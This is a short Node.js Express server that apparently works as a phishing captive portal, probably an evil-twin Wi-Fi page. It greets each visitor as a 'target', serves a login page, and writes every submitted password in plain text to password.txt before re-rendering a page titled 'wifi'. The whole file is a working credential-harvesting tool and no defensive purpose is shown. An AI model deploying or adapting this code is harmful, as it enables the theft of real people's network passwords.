const express = require('express')
const app = express()
const port = 4000

const fs = require('fs');

const BodyParser = require('body-parser')
app.use(BodyParser.urlencoded({extended: true}))

app.use(express.static('public'));

app.use('/css', express.static(__dirname + 'public/css'))

app.set('views', './views');
app.set('view engine', 'ejs');
var args = process.argv.slice(2);

app.get('', (req, res)=>{
    console.log("target has entered!")
    res.status(301).render('index', {title: args[0]});
});

app.post('/password', (req, res)=>{
    const pass = req.body.password;
    fs.appendFileSync('password.txt', `user password Entered : ${pass} \n`);
    fs.appendFileSync('password.txt', `\n-----------------------------------------------------------------\n\n`);
    res.status(301).render('index', {title: 'wifi'});
});


// Listen on Port 4000
app.listen(port, () => console.info(`App listening on port ${port}`))